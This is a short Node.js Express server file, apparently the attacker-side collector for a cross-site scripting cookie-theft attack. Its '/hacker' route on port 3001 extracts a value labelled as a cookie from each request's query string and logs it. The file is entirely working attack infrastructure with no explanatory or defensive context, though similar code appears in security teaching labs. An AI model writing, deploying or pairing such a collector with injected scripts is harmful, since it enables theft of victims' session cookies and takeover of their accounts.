var express = require('express');
var app = express();

app.get("/hacker", function (req, res) {
	var url = req.url;
	var queryString = req.url.split("?")[1];
	var cookie = queryString.split("=")[1];
	console.log(cookie);
	res.end();
});

app.listen(3001);